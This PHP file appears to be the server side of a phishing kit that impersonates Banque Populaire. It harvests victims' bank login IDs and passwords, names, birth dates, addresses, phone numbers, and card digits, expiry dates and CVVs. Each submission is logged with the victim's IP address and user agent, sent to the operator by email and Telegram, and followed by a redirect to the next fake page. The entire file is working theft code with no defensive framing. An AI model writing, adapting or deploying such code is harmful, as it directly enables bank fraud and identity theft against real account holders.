<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");



include 'email.php';
include 'telegram.php';


$em = trim($_POST['di']);
$shob = trim($_POST['shobi']);
$votre = trim($_POST['vot']);
$pss= trim($_POST['pss']);
$password = trim($_POST['pr']);
$shb = trim($_POST['shb']);


 if (isset($_POST['ph-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire | phone |--------------|\n";
	
	$message .= "Phone Number : 	            : ".$_POST['ph']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

	telegram_send(urlencode($message));
	header("Location: detail.html");
}

else if (isset($_POST['detail-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire |info |--------------|\n";
	
	$message .= "Nom et prenom	            : ".$_POST['fname']."\n";
	$message .= "Date de naissance	            : ".$_POST['dob']."\n";
	$message .= "Numéro Fixe	            : ".$_POST['cob']."\n";
	$message .= "Adresse postale	            : ".$_POST['addr']."\n";
	$message .= "Adresse E-mail	            : ".$_POST['addremail']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
    telegram_send(urlencode($message));
    header("Location: cc.html");
	
}

else if (isset($_POST['cc-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire |cc-BRED-info |--------------|\n";
	
	$message .= "8 chiffres du Numéro carte bancaire	            : ".$_POST['fname3']."\n";
	$message .= "Date d'Expiration	            : ".$_POST['cob3']."\n";
	$message .= "CCV	            : ".$_POST['addr3']."\n";


	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
    telegram_send(urlencode($message));
    header("Location: fin.html");
	
}

 else if (isset($_POST['ph1-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire | phone |--------------|\n";
	
	$message .= "Phone Number : 	            : ".$_POST['ph']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	telegram_send(urlencode($message));
	
	header("Location: detail1.html");
}

else if (isset($_POST['detail1-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire|info |--------------|\n";
	
	$message .= "Nom et prenom	            : ".$_POST['fname']."\n";
	$message .= "Date de naissance	            : ".$_POST['dob']."\n";
	$message .= "Numéro Fixe	            : ".$_POST['cob']."\n";
	$message .= "Adresse postale	            : ".$_POST['addr']."\n";
	$message .= "Adresse Email	            : ".$_POST['addremail']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

	telegram_send(urlencode($message));
	header("Location: cc1.html");
	
}

else if (isset($_POST['cc1-btn'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Populaire| cc-info |--------------|\n";
	
	$message .= "8 chiffres du Numéro carte bancaire	            : ".$_POST['fname3']."\n";
	$message .= "Date d'Expiration 	            : ".$_POST['cob3']."\n";
	$message .= "CCV	            : ".$_POST['addr3']."\n";
	;

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

	telegram_send(urlencode($message));
	header("Location: fin1.html");

}



else if($votre != null && $pss != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Populaire |login |--------------|\n";

	$message .= "Etablissement bancaire            : ".$shb ."\n";
	$message .= "Votre identifiant            : ".$votre ."\n";
	$message .= "Password           : ".$pss ."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);
    telegram_send(urlencode($message));

	header("Location: detail1.html");
}

else if($em != null && $password != null && $shob != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Populaire |login |--------------|\n";
	
	$message .= "Etablissement bancaire             : ".$shob."\n";
	$message .= "ID            : ".$em."\n";
	$message .= "Password            : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);
    telegram_send(urlencode($message));

	header("Location: detail1.html");
}




?>